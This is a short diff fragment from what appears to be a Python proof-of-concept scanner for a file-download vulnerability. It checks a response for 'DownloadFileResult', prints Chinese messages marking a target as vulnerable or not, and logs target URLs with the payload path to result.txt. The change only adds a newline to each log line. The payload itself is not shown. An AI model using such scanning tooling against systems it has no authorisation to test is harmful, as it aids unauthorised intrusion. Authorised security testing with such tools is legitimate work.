@@ -63,7 +63,7 @@ def poc(target):
         if response.status_code == 200 and 'DownloadFileResult' in response.text:
             print( f"[+] {target} 存在漏洞！ ")
             with open('result.txt','a',encoding='utf-8')as f:
-                f.write(target+url_payload)
+                f.write(target+url_payload+'\n')
                 return True
         else:
             print("[-] 不存在漏洞！！")
